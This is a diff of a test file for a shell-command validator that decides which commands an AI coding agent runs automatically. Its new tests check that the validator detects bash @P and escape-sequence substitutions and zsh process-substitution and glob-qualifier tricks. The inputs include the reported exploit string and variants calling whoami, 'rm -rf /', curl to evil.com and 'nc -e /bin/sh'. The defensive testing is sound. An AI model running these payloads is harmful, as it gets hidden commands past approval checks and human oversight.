@@ -6,13 +6,12 @@ import {
 	parseCommand,
 	isAutoApprovedSingleCommand,
 	isAutoDeniedSingleCommand,
-	isAutoApprovedCommand,
-	isAutoDeniedCommand,
 	findLongestPrefixMatch,
 	getCommandDecision,
 	getSingleCommandDecision,
 	CommandValidator,
 	createCommandValidator,
+	containsDangerousSubstitution,
 } from "../command-validation"
 
 describe("Command Validation", () => {
@@ -22,6 +21,14 @@ describe("Command Validation", () => {
 			expect(parseCommand("npm test || npm run build")).toEqual(["npm test", "npm run build"])
 			expect(parseCommand("npm test; npm run build")).toEqual(["npm test", "npm run build"])
 			expect(parseCommand("npm test | npm run build")).toEqual(["npm test", "npm run build"])
+			expect(parseCommand("npm test & npm run build")).toEqual(["npm test", "npm run build"])
+		})
+
+		it("handles & operator for background execution", () => {
+			expect(parseCommand("ls & whoami")).toEqual(["ls", "whoami"])
+			expect(parseCommand("ls & whoami & pwd")).toEqual(["ls", "whoami", "pwd"])
+			expect(parseCommand("ls && whoami & pwd || echo done")).toEqual(["ls", "whoami", "pwd", "echo done"])
+			expect(parseCommand("ls&whoami")).toEqual(["ls", "whoami"])
 		})
 
 		it("preserves quoted content", () => {
@@ -33,6 +40,7 @@ describe("Command Validation", () => {
 		it("handles subshell patterns", () => {
 			expect(parseCommand("npm test $(echo test)")).toEqual(["npm test", "echo test"])
 			expect(parseCommand("npm test `echo test`")).toEqual(["npm test", "echo test"])
+			expect(parseCommand("diff <(sort f1) <(sort f2)")).toEqual(["diff", "sort f1", "sort f2"])
 		})
 
 		it("handles empty and whitespace input", () => {
@@ -50,9 +58,124 @@ describe("Command Validation", () => {
 				parseCommand('npm test | Select-String -NotMatch "node_modules" | Select-String "FAIL|Error"'),
 			).toEqual(["npm test", 'Select-String -NotMatch "node_modules"', 'Select-String "FAIL|Error"'])
 		})
+
+		describe("newline handling", () => {
+			it("splits commands by Unix newlines (\\n)", () => {
+				expect(parseCommand("echo hello\ngit status\nnpm install")).toEqual([
+					"echo hello",
+					"git status",
+					"npm install",
+				])
+			})
+
+			it("splits commands by Windows newlines (\\r\\n)", () => {
+				expect(parseCommand("echo hello\r\ngit status\r\nnpm install")).toEqual([
+					"echo hello",
+					"git status",
+					"npm install",
+				])
+			})
+
+			it("splits commands by old Mac newlines (\\r)", () => {
+				expect(parseCommand("echo hello\rgit status\rnpm install")).toEqual([
+					"echo hello",
+					"git status",
+					"npm install",
+				])
+			})
+
+			it("handles mixed line endings", () => {
+				expect(parseCommand("echo hello\ngit status\r\nnpm install\rls -la")).toEqual([
+					"echo hello",
+					"git status",
+					"npm install",
+					"ls -la",
+				])
+			})
+
+			it("ignores empty lines", () => {
+				expect(parseCommand("echo hello\n\n\ngit status\r\n\r\nnpm install")).toEqual([
+					"echo hello",
+					"git status",
+					"npm install",
+				])
+			})
+
+			it("handles newlines with chain operators", () => {
+				expect(parseCommand('npm install && npm test\ngit add .\ngit commit -m "test"')).toEqual([
+					"npm install",
+					"npm test",
+					"git add .",
+					'git commit -m "test"',
+				])
+			})
+
+			it("splits on actual newlines even within quotes", () => {
+				// Note: Since we split by newlines first, actual newlines in the input
+				// will split the command, even if they appear to be within quotes
+				// Using template literal to create actual newline
+				const commandWithNewlineInQuotes = `echo "Hello
+World"
+git status`
+				// The quotes get stripped because they're no longer properly paired after splitting
+				expect(parseCommand(commandWithNewlineInQuotes)).toEqual(["echo Hello", "World", "git status"])
+			})
+
+			it("handles quoted strings on single line", () => {
+				// When quotes are on the same line, they are preserved
+				expect(parseCommand('echo "Hello World"\ngit status')).toEqual(['echo "Hello World"', "git status"])
+			})
+
+			it("handles complex multi-line commands", () => {
+				const multiLineCommand = `npm install
+npm test && npm run build
+echo "Done" | tee output.log
+git status; git add .
+ls -la || echo "Failed"`
+
+				expect(parseCommand(multiLineCommand)).toEqual([
+					"npm install",
+					"npm test",
+					"npm run build",
+					'echo "Done"',
+					"tee output.log",
+					"git status",
+					"git add .",
+					"ls -la",
+					'echo "Failed"',
+				])
+			})
+
+			it("handles newlines with subshells", () => {
+				expect(parseCommand("echo $(date)\nnpm test\ngit status")).toEqual([
+					"echo",
+					"date",
+					"npm test",
+					"git status",
+				])
+			})
+
+			it("handles newlines with redirections", () => {
+				expect(parseCommand("npm test 2>&1\necho done\nls -la > files.txt")).toEqual([
+					"npm test 2>&1",
+					"echo done",
+					"ls -la > files.txt",
+				])
+			})
+
+			it("handles empty input with newlines", () => {
+				expect(parseCommand("\n\n\n")).toEqual([])
+				expect(parseCommand("\r\n\r\n")).toEqual([])
+				expect(parseCommand("\r\r\r")).toEqual([])
+			})
+
+			it("handles whitespace-only lines", () => {
+				expect(parseCommand("echo hello\n   \t   \ngit status")).toEqual(["echo hello", "git status"])
+			})
+		})
 	})
 
-	describe("isAutoApprovedSingleCommand (legacy behavior)", () => {
+	describe("isAutoApprovedSingleCommand", () => {
 		const allowedCommands = ["npm test", "npm run", "echo"]
 
 		it("matches commands case-insensitively", () => {
@@ -79,90 +202,183 @@ describe("Command Validation", () => {
 		})
 	})
 
-	describe("isAutoApprovedCommand (legacy behavior)", () => {
-		const allowedCommands = ["npm test", "npm run", "echo", "Select-String"]
-
-		it("validates simple commands", () => {
-			expect(isAutoApprovedCommand("npm test", allowedCommands)).toBe(true)
-			expect(isAutoApprovedCommand("npm run build", allowedCommands)).toBe(true)
-			expect(isAutoApprovedCommand("dangerous", allowedCommands)).toBe(false)
+	describe("containsDangerousSubstitution", () => {
+		it("detects parameter expansion with @P operator (prompt string expansion)", () => {
+			// This is the specific vulnerability from the report - @P can execute commands
+			expect(containsDangerousSubstitution('echo "${var1=aa\\140whoami\\140c}${var1@P}"')).toBe(true)
+			expect(containsDangerousSubstitution("echo ${var@P}")).toBe(true)
+			expect(containsDangerousSubstitution("result=${input@P}")).toBe(true)
+			expect(containsDangerousSubstitution("${somevar@P}")).toBe(true)
 		})
 
-		it("validates chained commands", () => {
-			expect(isAutoApprovedCommand("npm test && npm run build", allowedCommands)).toBe(true)
-			expect(isAutoApprovedCommand("npm test && dangerous", allowedCommands)).toBe(false)
-			expect(isAutoApprovedCommand('npm test | Select-String "Error"', allowedCommands)).toBe(true)
-			expect(isAutoApprovedCommand("npm test | rm -rf /", allowedCommands)).toBe(false)
+		it("detects other dangerous parameter expansion operators", () => {
+			// @Q - Quote removal
+			expect(containsDangerousSubstitution("echo ${var@Q}")).toBe(true)
+			// @E - Escape sequence expansion
+			expect(containsDangerousSubstitution("echo ${var@E}")).toBe(true)
+			// @A - Assignment statement
+			expect(containsDangerousSubstitution("echo ${var@A}")).toBe(true)
+			// @a - Attribute flags
+			expect(containsDangerousSubstitution("echo ${var@a}")).toBe(true)
 		})
 
-		it("handles quoted content correctly", () => {
-			expect(isAutoApprovedCommand('npm test "param with | inside"', allowedCommands)).toBe(true)
-			expect(isAutoApprovedCommand('echo "hello | world"', allowedCommands)).toBe(true)
-			expect(isAutoApprovedCommand('npm test "param with && inside"', allowedCommands)).toBe(true)
+		it("detects parameter assignments with octal escape sequences", () => {
+			// Octal \140 is backtick, which can execute commands
+			expect(containsDangerousSubstitution('echo "${var=\\140whoami\\140}"')).toBe(true)
+			expect(containsDangerousSubstitution('echo "${var:=\\140ls\\140}"')).toBe(true)
+			expect(containsDangerousSubstitution('echo "${var+\\140pwd\\140}"')).toBe(true)
+			expect(containsDangerousSubstitution('echo "${var:-\\140date\\140}"')).toBe(true)
+			expect(containsDangerousSubstitution('echo "${var:+\\140echo test\\140}"')).toBe(true)
+			expect(containsDangerousSubstitution('echo "${var:?\\140rm file\\140}"')).toBe(true)
+			// Test various octal patterns
+			expect(containsDangerousSubstitution('echo "${var=\\001\\140\\141}"')).toBe(true)
+			expect(containsDangerousSubstitution('echo "${var=\\777}"')).toBe(true)
 		})
 
-		it("handles subshell execution attempts", () => {
-			// Without denylist, subshells should be allowed if all subcommands are allowed
-			expect(isAutoApprovedCommand("npm test $(echo hello)", allowedCommands)).toBe(true)
-			expect(isAutoApprovedCommand("npm test `echo world`", allowedCommands)).toBe(true)
-
-			// With denylist, subshells should be blocked regardless of subcommands
-			expect(isAutoApprovedCommand("npm test $(echo hello)", allowedCommands, ["rm"])).toBe(false)
-			expect(isAutoApprovedCommand("npm test `echo world`", allowedCommands, ["rm"])).toBe(false)
+		it("detects parameter assignments with hex escape sequences", () => {
+			// Hex \x60 is backtick
+			expect(containsDangerousSubstitution('echo "${var=\\x60whoami\\x60}"')).toBe(true)
+			expect(containsDangerousSubstitution('echo "${var:=\\x60ls\\x60}"')).toBe(true)
+			expect(containsDangerousSubstitution('echo "${var+\\x60pwd\\x60}"')).toBe(true)
+			expect(containsDangerousSubstitution('echo "${var:-\\x60date\\x60}"')).toBe(true)
+			// Test various hex patterns
+			expect(containsDangerousSubstitution('echo "${var=\\x00\\x60\\x61}"')).toBe(true)
+			expect(containsDangerousSubstitution('echo "${var=\\xFF}"')).toBe(true)
 		})
 
-		it("handles PowerShell patterns", () => {
-			expect(isAutoApprovedCommand('npm test 2>&1 | Select-String "Error"', allowedCommands)).toBe(true)
-			expect(
-				isAutoApprovedCommand(
-					'npm test | Select-String -NotMatch "node_modules" | Select-String "FAIL|Error"',
-					allowedCommands,
-				),
-			).toBe(true)
-			expect(isAutoApprovedCommand("npm test | Select-String | dangerous", allowedCommands)).toBe(false)
+		it("detects parameter assignments with unicode escape sequences", () => {
+			// Unicode \u0060 is backtick
+			expect(containsDangerousSubstitution('echo "${var=\\u0060whoami\\u0060}"')).toBe(true)
+			expect(containsDangerousSubstitution('echo "${var:=\\u0060ls\\u0060}"')).toBe(true)
+			expect(containsDangerousSubstitution('echo "${var+\\u0060pwd\\u0060}"')).toBe(true)
+			expect(containsDangerousSubstitution('echo "${var:-\\u0060date\\u0060}"')).toBe(true)
+			// Test various unicode patterns
+			expect(containsDangerousSubstitution('echo "${var=\\u0000\\u0060\\u0061}"')).toBe(true)
+			expect(containsDangerousSubstitution('echo "${var=\\uFFFF}"')).toBe(true)
 		})
 
-		it("handles empty input", () => {
-			expect(isAutoApprovedCommand("", allowedCommands)).toBe(true)
-			expect(isAutoApprovedCommand("	", allowedCommands)).toBe(true)
+		it("detects indirect variable references", () => {
+			// ${!var} performs indirect expansion which can be dangerous
+			expect(containsDangerousSubstitution("echo ${!var}")).toBe(true)
+			expect(containsDangerousSubstitution("result=${!indirect}")).toBe(true)
+			expect(containsDangerousSubstitution("${!prefix*}")).toBe(true)
+			expect(containsDangerousSubstitution("${!prefix@}")).toBe(true)
 		})
 
-		it("allows all commands when wildcard is present", () => {
-			const wildcardAllowedCommands = ["*"]
-			// Should allow any command, including dangerous ones
-			expect(isAutoApprovedCommand("rm -rf /", wildcardAllowedCommands)).toBe(true)
-			expect(isAutoApprovedCommand("dangerous-command", wildcardAllowedCommands)).toBe(true)
-			expect(isAutoApprovedCommand("npm test && rm -rf /", wildcardAllowedCommands)).toBe(true)
-			// Should allow subshell commands with wildcard when no denylist is present
-			expect(isAutoApprovedCommand("npm test $(echo dangerous)", wildcardAllowedCommands)).toBe(true)
-			expect(isAutoApprovedCommand("npm test `rm -rf /`", wildcardAllowedCommands)).toBe(true)
-
-			// But should block subshells when denylist is present
-			expect(isAutoApprovedCommand("npm test $(echo dangerous)", wildcardAllowedCommands, ["rm"])).toBe(false)
-			expect(isAutoApprovedCommand("npm test `rm -rf /`", wildcardAllowedCommands, ["rm"])).toBe(false)
+		it("detects here-strings with command substitution", () => {
+			expect(containsDangerousSubstitution("cat <<<$(whoami)")).toBe(true)
+			expect(containsDangerousSubstitution("read <<<`date`")).toBe(true)
+			expect(containsDangerousSubstitution("grep pattern <<< $(ls)")).toBe(true)
+			expect(containsDangerousSubstitution("sort <<< `pwd`")).toBe(true)
 		})
 
-		it("respects denylist even with wildcard in allowlist", () => {
-			const wildcardAllowedCommands = ["*"]
-			const deniedCommands = ["rm -rf", "dangerous"]
+		it("detects zsh process substitution =() pattern", () => {
+			expect(containsDangerousSubstitution("ls =(open -a Calculator)")).toBe(true)
 
-			// Wildcard should allow most commands
-			expect(isAutoApprovedCommand("npm test", wildcardAllowedCommands, deniedCommands)).toBe(true)
-			expect(isAutoApprovedCommand("echo hello", wildcardAllowedCommands, deniedCommands)).toBe(true)
-			expect(isAutoApprovedCommand("git status", wildcardAllowedCommands, deniedCommands)).toBe(true)
+			// Various forms of zsh process substitution
+			expect(containsDangerousSubstitution("cat =(echo test)")).toBe(true)
+			expect(containsDangerousSubstitution("diff =(ls) =(pwd)")).toBe(true)
+			expect(containsDangerousSubstitution("vim =(curl http://evil.com/script)")).toBe(true)
+			expect(containsDangerousSubstitution("=(whoami)")).toBe(true)
 
-			// But denylist should still block specific commands
-			expect(isAutoApprovedCommand("rm -rf /", wildcardAllowedCommands, deniedCommands)).toBe(false)
-			expect(isAutoApprovedCommand("dangerous-command", wildcardAllowedCommands, deniedCommands)).toBe(false)
+			// Process substitution in middle of command
+			expect(containsDangerousSubstitution("echo test =(date) test")).toBe(true)
 
-			// Chained commands with denied subcommands should be blocked
-			expect(isAutoApprovedCommand("npm test && rm -rf /", wildcardAllowedCommands, deniedCommands)).toBe(false)
-			expect(
-				isAutoApprovedCommand("echo hello && dangerous-command", wildcardAllowedCommands, deniedCommands),
-			).toBe(false)
+			// Multiple process substitutions
+			expect(containsDangerousSubstitution("compare =(cmd1) =(cmd2) =(cmd3)")).toBe(true)
 
-			// But chained commands with all allowed subcommands should work
-			expect(isAutoApprovedCommand("npm test && echo done", wildcardAllowedCommands, deniedCommands)).toBe(true)
+			// Process substitution with complex commands
+			expect(containsDangerousSubstitution("cat =(rm -rf /)")).toBe(true)
+			expect(containsDangerousSubstitution("ls =(sudo apt install malware)")).toBe(true)
+		})
+
+		it("detects zsh glob qualifiers with code execution (e:...:)", () => {
+			// Basic glob qualifier with command execution
+			expect(containsDangerousSubstitution("ls *(e:whoami:)")).toBe(true)
+
+			// Various glob patterns with code execution
+			expect(containsDangerousSubstitution("cat ?(e:rm -rf /:)")).toBe(true)
+			expect(containsDangerousSubstitution("echo +(e:sudo reboot:)")).toBe(true)
+			expect(containsDangerousSubstitution("rm @(e:curl evil.com:)")).toBe(true)
+			expect(containsDangerousSubstitution("touch !(e:nc -e /bin/sh:)")).toBe(true)
+
+			// Glob qualifiers in middle of command
+			expect(containsDangerousSubstitution("ls -la *(e:date:) test")).toBe(true)
+
+			// Multiple glob qualifiers
+			expect(containsDangerousSubstitution("cat *(e:whoami:) ?(e:pwd:)")).toBe(true)
+
+			// Glob qualifiers with complex commands
+			expect(containsDangerousSubstitution("ls *(e:open -a Calculator:)")).toBe(true)
+			expect(containsDangerousSubstitution("rm *(e:sudo apt install malware:)")).toBe(true)
+		})
+
+		it("does NOT flag safe parameter expansions", () => {
+			// Regular parameter expansions without dangerous operators
+			expect(containsDangerousSubstitution("echo ${var}")).toBe(false)
+			expect(containsDangerousSubstitution("echo ${var:-default}")).toBe(false)
+			expect(containsDangerousSubstitution("echo ${var:+alternative}")).toBe(false)
+			expect(containsDangerousSubstitution("echo ${#var}")).toBe(false)
+			expect(containsDangerousSubstitution("echo ${var%pattern}")).toBe(false)
+			expect(containsDangerousSubstitution("echo ${var#pattern}")).toBe(false)
+			expect(containsDangerousSubstitution("echo ${var/old/new}")).toBe(false)
+			expect(containsDangerousSubstitution("echo ${var^^}")).toBe(false)
+			expect(containsDangerousSubstitution("echo ${var,,}")).toBe(false)
+			expect(containsDangerousSubstitution("echo ${var:0:5}")).toBe(false)
+
+			// Parameter assignments without escape sequences
+			expect(containsDangerousSubstitution('echo "${var=normal text}"')).toBe(false)
+			expect(containsDangerousSubstitution('echo "${var:-default value}"')).toBe(false)
+			expect(containsDangerousSubstitution('echo "${var:+alternative}"')).toBe(false)
+
+			// Here-strings without command substitution
+			expect(containsDangerousSubstitution("cat <<<plain_text")).toBe(false)
+			expect(containsDangerousSubstitution('read <<<"static string"')).toBe(false)
+			expect(containsDangerousSubstitution("grep <<<$var")).toBe(false) // Plain variable, not command substitution
+
+			// Safe uses of = without process substitution
+			expect(containsDangerousSubstitution("var=value")).toBe(false)
+			expect(containsDangerousSubstitution("test = test")).toBe(false)
+			expect(containsDangerousSubstitution("if [ $a = $b ]; then")).toBe(false)
+			expect(containsDangerousSubstitution("echo test=value")).toBe(false)
+
+			// Safe comparison operators
+			expect(containsDangerousSubstitution("if [ $a == $b ]; then")).toBe(false)
+			expect(containsDangerousSubstitution("test $x != $y")).toBe(false)
+
+			// Safe glob patterns without code execution qualifiers
+			expect(containsDangerousSubstitution("ls *")).toBe(false)
+			expect(containsDangerousSubstitution("rm *.txt")).toBe(false)
+			expect(containsDangerousSubstitution("cat ?(foo|bar)")).toBe(false)
+			expect(containsDangerousSubstitution("echo *(^/)")).toBe(false) // Safe glob qualifier (not e:)
+		})
+
+		it("handles complex combinations of dangerous patterns", () => {
+			// Multiple dangerous patterns in one command
+			expect(containsDangerousSubstitution('echo "${var1=\\140ls\\140}${var1@P}" && ${!indirect}')).toBe(true)
+			// Nested patterns
+			expect(containsDangerousSubstitution('echo "${outer=${inner@P}}"')).toBe(true)
+			// Mixed with safe patterns
+			expect(containsDangerousSubstitution("echo ${safe:-default} ${dangerous@P}")).toBe(true)
+			// Zsh process substitution combined with other patterns
+			expect(containsDangerousSubstitution("cat =(whoami) && echo ${var@P}")).toBe(true)
+			expect(containsDangerousSubstitution("ls =(date) <<<$(pwd)")).toBe(true)
+		})
+
+		it("detects the exact exploit from the security report", () => {
+			// The exact pattern reported in the vulnerability
+			const exploit = 'echo "${var1=aa\\140whoami\\140c}${var1@P}"'
+			expect(containsDangerousSubstitution(exploit)).toBe(true)
+
+			// Variations of the exploit
+			expect(containsDangerousSubstitution('echo "${x=\\140id\\140}${x@P}"')).toBe(true)
+			expect(containsDangerousSubstitution('result="${cmd=\\x60pwd\\x60}${cmd@P}"')).toBe(true)
+
+			// The new zsh process substitution exploit
+			expect(containsDangerousSubstitution("ls =(open -a Calculator)")).toBe(true)
+
+			// The zsh glob qualifier exploit
+			expect(containsDangerousSubstitution("ls *(e:whoami:)")).toBe(true)
 		})
 	})
 })
@@ -276,51 +492,122 @@ done`
 				parseCommand(problematicPart)
 			}).not.toThrow("Bad substitution")
 		})
-	})
 
-	describe("isAutoApprovedCommand (legacy behavior)", () => {
-		it("should validate allowed commands", () => {
-			const result = isAutoApprovedCommand("echo hello", ["echo"])
-			expect(result).toBe(true)
-		})
-
-		it("should reject disallowed commands", () => {
-			const result = isAutoApprovedCommand("rm -rf /", ["echo", "ls"])
-			expect(result).toBe(false)
-		})
-
-		it("should not fail validation for commands with simple $RANDOM variable", () => {
-			const commandWithRandom = "echo $RANDOM"
+		it("should handle bash arithmetic expressions with $(())", () => {
+			// Test the exact script from the user's error
+			const bashScript = `jsx_files=$(find resources/js -name "*.jsx" -type f -not -path "*/node_modules/*")
+count=0
+for file in $jsx_files; do
+  ts_file="\${file%.jsx}.tsx"
+  if [ ! -f "$ts_file" ]; then
+    cp "$file" "$ts_file"
+    count=$((count + 1))
+  fi
+done
+echo "Successfully converted $count .jsx files to .tsx"`
 
 			expect(() => {
-				isAutoApprovedCommand(commandWithRandom, ["echo"])
+				parseCommand(bashScript)
+			}).not.toThrow("Bad substitution: calc.add")
+		})
+
+		it("should correctly parse commands with arithmetic expressions", () => {
+			const result = parseCommand("count=$((count + 1)) && echo $count")
+			expect(result).toEqual(["count=$((count + 1))", "echo $count"])
+		})
+
+		it("should handle nested arithmetic expressions", () => {
+			const result = parseCommand("result=$((10 * (5 + 3))) && echo $result")
+			expect(result).toEqual(["result=$((10 * (5 + 3)))", "echo $result"])
+		})
+
+		it("should handle arithmetic expressions with variables", () => {
+			const result = parseCommand("total=$((price * quantity + tax))")
+			expect(result).toEqual(["total=$((price * quantity + tax))"])
+		})
+
+		it("should handle complex parameter expansions without errors", () => {
+			const commands = [
+				"echo ${var:-default}",
+				"echo ${#array[@]}",
+				"echo ${var%suffix}",
+				"echo ${var#prefix}",
+				"echo ${var/pattern/replacement}",
+				"echo ${!var}",
+				"echo ${var:0:5}",
+				"echo ${var,,}",
+				"echo ${var^^}",
+			]
+
+			commands.forEach((cmd) => {
+				expect(() => {
+					parseCommand(cmd)
+				}).not.toThrow()
+			})
+		})
+
+		it("should handle process substitutions without errors", () => {
+			const commands = [
+				"diff <(sort file1) <(sort file2)",
+				"command >(gzip > output.gz)",
+				"while read line; do echo $line; done < <(cat file)",
+			]
+
+			commands.forEach((cmd) => {
+				expect(() => {
+					parseCommand(cmd)
+				}).not.toThrow()
+			})
+		})
+
+		it("should handle special bash variables without errors", () => {
+			const commands = [
+				"echo $?",
+				"echo $!",
+				"echo $#",
+				"echo $$",
+				"echo $@",
+				"echo $*",
+				"echo $-",
+				"echo $0",
+				"echo $1 $2 $3",
+			]
+
+			commands.forEach((cmd) => {
+				expect(() => {
+					parseCommand(cmd)
+				}).not.toThrow()
+			})
+		})
+
+		it("should handle mixed complex bash constructs", () => {
+			const complexCommand = `
+				for file in \${files[@]}; do
+					if [[ -f "\${file%.txt}.bak" ]]; then
+						count=\$((count + 1))
+						echo "Processing \${file} (\$count/\${#files[@]})"
+						result=\$(process_file "\$file" 2>&1)
+						if [[ \$? -eq 0 ]]; then
+							echo "Success: \$result" >(logger)
+						fi
+					fi
+				done
+			`
+
+			expect(() => {
+				parseCommand(complexCommand)
 			}).not.toThrow()
 		})
 
-		it("should not fail validation for commands with simple array indexing using $RANDOM", () => {
-			const commandWithRandomIndex = "echo ${array[$RANDOM]}"
+		it("should handle fallback parsing when shell-quote fails", () => {
+			// Test a command that might cause shell-quote to fail
+			const problematicCommand = "echo ${unclosed"
 
 			expect(() => {
-				isAutoApprovedCommand(commandWithRandomIndex, ["echo"])
+				const result = parseCommand(problematicCommand)
+				// Should not throw and should return some result
+				expect(Array.isArray(result)).toBe(true)
 			}).not.toThrow()
-		})
-
-		it("should return false for the full log generator command due to subshell detection when denylist is present", () => {
-			// This is the exact command from the original error message
-			const logGeneratorCommand = `while true; do \\
-		levels=(INFO WARN ERROR DEBUG); \\
-		msgs=("User logged in" "Connection timeout" "Processing request" "Cache miss" "Database query"); \\
-		level=\${levels[$RANDOM % \${#levels[@]}]}; \\
-		msg=\${msgs[$RANDOM % \${#msgs[@]}]}; \\
-		echo "\$(date '+%Y-%m-%d %H:%M:%S') [$level] $msg"; \\
-		sleep 1; \\
-done`
-
-			// Without denylist, should allow subshells if all subcommands are allowed (use wildcard)
-			expect(isAutoApprovedCommand(logGeneratorCommand, ["*"])).toBe(true)
-
-			// With denylist, should return false due to subshell detection
-			expect(isAutoApprovedCommand(logGeneratorCommand, ["*"], ["rm"])).toBe(false)
 		})
 	})
 
@@ -352,7 +639,7 @@ done`
 			})
 		})
 
-		describe("Legacy isAllowedSingleCommand behavior (now using isAutoApprovedSingleCommand)", () => {
+		describe("isAutoApprovedSingleCommand", () => {
 			const allowedCommands = ["npm", "echo", "git"]
 			const deniedCommands = ["npm test", "git push"]
 
@@ -529,75 +816,9 @@ done`
 					})
 				})
 			})
-
-			describe("Command-level three-tier validation", () => {
-				const allowedCommands = ["npm", "echo"]
-				const deniedCommands = ["npm test"]
-
-				describe("isAutoApprovedCommand", () => {
-					it("auto-approves commands with all sub-commands auto-approved", () => {
-						expect(isAutoApprovedCommand("npm install", allowedCommands, deniedCommands)).toBe(true)
-						expect(isAutoApprovedCommand("npm install && echo done", allowedCommands, deniedCommands)).toBe(
-							true,
-						)
-					})
-
-					it("does not auto-approve commands with any sub-command not auto-approved", () => {
-						expect(isAutoApprovedCommand("npm test", allowedCommands, deniedCommands)).toBe(false)
-						expect(isAutoApprovedCommand("npm install && npm test", allowedCommands, deniedCommands)).toBe(
-							false,
-						)
-					})
-
-					it("blocks subshell commands only when denylist is present", () => {
-						// Without denylist, should allow subshells
-						expect(isAutoApprovedCommand("npm install $(echo test)", allowedCommands)).toBe(true)
-						expect(isAutoApprovedCommand("npm install `echo test`", allowedCommands)).toBe(true)
-
-						// With denylist, should block subshells
-						expect(isAutoApprovedCommand("npm install $(echo test)", allowedCommands, deniedCommands)).toBe(
-							false,
-						)
-						expect(isAutoApprovedCommand("npm install `echo test`", allowedCommands, deniedCommands)).toBe(
-							false,
-						)
-					})
-				})
-
-				describe("isAutoDeniedCommand", () => {
-					it("auto-denies commands with any sub-command auto-denied", () => {
-						expect(isAutoDeniedCommand("npm test", allowedCommands, deniedCommands)).toBe(true)
-						expect(isAutoDeniedCommand("npm install && npm test", allowedCommands, deniedCommands)).toBe(
-							true,
-						)
-					})
-
-					it("does not auto-deny commands with all sub-commands not auto-denied", () => {
-						expect(isAutoDeniedCommand("npm install", allowedCommands, deniedCommands)).toBe(false)
-						expect(isAutoDeniedCommand("npm install && echo done", allowedCommands, deniedCommands)).toBe(
-							false,
-						)
-					})
-
-					it("auto-denies subshell commands only when denylist is present", () => {
-						// Without denylist, should not auto-deny subshells
-						expect(isAutoDeniedCommand("npm install $(echo test)", allowedCommands)).toBe(false)
-						expect(isAutoDeniedCommand("npm install `echo test`", allowedCommands)).toBe(false)
-
-						// With denylist, should auto-deny subshells
-						expect(isAutoDeniedCommand("npm install $(echo test)", allowedCommands, deniedCommands)).toBe(
-							true,
-						)
-						expect(isAutoDeniedCommand("npm install `echo test`", allowedCommands, deniedCommands)).toBe(
-							true,
-						)
-					})
-				})
-			})
 		})
 	})
 })
-
 describe("Unified Command Decision Functions", () => {
 	describe("getSingleCommandDecision", () => {
 		const allowedCommands = ["npm", "echo", "git"]
@@ -670,6 +891,131 @@ describe("Unified Command Decision Functions", () => {
 			expect(getCommandDecision("npm install && echo done", allowedCommands, deniedCommands)).toBe("auto_approve")
 		})
 
+		describe("dangerous substitution handling", () => {
+			it("prevents auto-approve for commands with dangerous parameter expansion", () => {
+				// Commands that would normally be auto-approved are blocked by dangerous patterns
+				expect(getCommandDecision("echo ${var@P}", allowedCommands, deniedCommands)).toBe("ask_user")
+				expect(getCommandDecision("echo hello", allowedCommands, deniedCommands)).toBe("auto_approve") // Safe version
+
+				// Even with allowed prefix, dangerous patterns prevent auto-approval
+				expect(getCommandDecision("npm install ${var@P}", allowedCommands, deniedCommands)).toBe("ask_user")
+				expect(
+					getCommandDecision('echo "${var1=\\140whoami\\140c}${var1@P}"', allowedCommands, deniedCommands),
+				).toBe("ask_user")
+			})
+
+			it("does NOT override auto_deny decisions with dangerous patterns", () => {
+				// If a command would be denied, dangerous patterns don't change that
+				expect(getCommandDecision("npm test ${var@P}", allowedCommands, deniedCommands)).toBe("auto_deny")
+				expect(getCommandDecision('npm test "${var=\\140ls\\140}"', allowedCommands, deniedCommands)).toBe(
+					"auto_deny",
+				)
+
+				// Regular denied commands without dangerous patterns
+				expect(getCommandDecision("npm test --coverage", allowedCommands, deniedCommands)).toBe("auto_deny")
+			})
+
+			it("prevents auto-approval for various dangerous substitution types", () => {
+				// Octal escape sequences
+				expect(getCommandDecision('echo "${var=\\140ls\\140}"', allowedCommands, deniedCommands)).toBe(
+					"ask_user",
+				)
+				expect(getCommandDecision('npm run "${var:=\\140pwd\\140}"', allowedCommands, deniedCommands)).toBe(
+					"ask_user",
+				)
+
+				// Hex escape sequences
+				expect(getCommandDecision('echo "${var=\\x60whoami\\x60}"', allowedCommands, deniedCommands)).toBe(
+					"ask_user",
+				)
+
+				// Indirect variable references
+				expect(getCommandDecision("echo ${!var}", allowedCommands, deniedCommands)).toBe("ask_user")
+
+				// Here-strings with command substitution
+				expect(getCommandDecision("cat <<<$(whoami)", allowedCommands, deniedCommands)).toBe("ask_user")
+				expect(getCommandDecision("read <<<`date`", allowedCommands, deniedCommands)).toBe("ask_user")
+			})
+
+			it("allows safe parameter expansions to follow normal rules", () => {
+				// Safe parameter expansions should follow normal allowlist/denylist rules
+				expect(getCommandDecision("echo ${var}", allowedCommands, deniedCommands)).toBe("auto_approve")
+				expect(getCommandDecision("echo ${var:-default}", allowedCommands, deniedCommands)).toBe("auto_approve")
+				expect(getCommandDecision("npm install ${package_name}", allowedCommands, deniedCommands)).toBe(
+					"auto_approve",
+				)
+
+				// Here-strings without command substitution are safe
+				expect(getCommandDecision("echo test <<<$var", allowedCommands, deniedCommands)).toBe("auto_approve")
+			})
+
+			it("handles command chains correctly with dangerous patterns", () => {
+				// If any part of a chain has dangerous substitution, prevent auto-approval
+				expect(getCommandDecision("npm install && echo ${var@P}", allowedCommands, deniedCommands)).toBe(
+					"ask_user",
+				)
+				expect(
+					getCommandDecision('echo safe && echo "${var=\\140ls\\140}"', allowedCommands, deniedCommands),
+				).toBe("ask_user")
+
+				// But if chain would be denied, keep the deny decision
+				expect(getCommandDecision("npm test ${var@P} && echo safe", allowedCommands, deniedCommands)).toBe(
+					"auto_deny",
+				)
+				expect(getCommandDecision("npm install && npm test ${var@P}", allowedCommands, deniedCommands)).toBe(
+					"auto_deny",
+				)
+
+				// Safe chains should still be auto-approved
+				expect(getCommandDecision("npm install && echo done", allowedCommands, deniedCommands)).toBe(
+					"auto_approve",
+				)
+			})
+
+			it("handles the exact exploit from the security report", () => {
+				const exploit = 'echo "${var1=aa\\140whoami\\140c}${var1@P}"'
+				// Even though 'echo' is in the allowlist, the dangerous pattern prevents auto-approval
+				expect(getCommandDecision(exploit, allowedCommands, deniedCommands)).toBe("ask_user")
+
+				// But if it were a denied command, it would still be denied
+				expect(getCommandDecision(`npm test ${exploit}`, allowedCommands, deniedCommands)).toBe("auto_deny")
+			})
+
+			it("prevents auto-approval for zsh process substitution exploits", () => {
+				// The new zsh process substitution exploit
+				const zshExploit = "ls =(open -a Calculator)"
+				// Even though 'ls' might be allowed, the dangerous pattern prevents auto-approval
+				expect(getCommandDecision(zshExploit, ["ls", "echo"], [])).toBe("ask_user")
+
+				// Various forms should all be blocked
